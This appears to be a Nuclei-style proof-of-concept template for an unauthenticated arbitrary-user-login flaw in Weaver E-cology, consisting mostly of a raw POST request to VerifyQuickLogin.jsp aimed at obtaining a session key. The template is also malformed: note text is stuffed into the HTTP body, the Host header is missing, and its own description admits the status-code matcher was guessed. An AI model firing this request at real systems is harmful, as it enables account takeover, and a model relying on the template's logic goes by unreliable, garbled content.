id: poc-nyhfqpkt0sd3a4n5
info:
  name: 泛微 E-cology 存在任意用户登录漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: unauth,2024
http:
- raw:
  - 'POST /mobile/plugin/VerifyQuickLogin.jsp HTTP/1.1


    Content-Type: application/x-www-form-urlencoded


    identifier=1&language=1&ipaddress=1.1.1.1


    # 响应代码特征

    -1


    # 响应内容特征

    sessionkey


    # 上传文件定位

    暂无'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
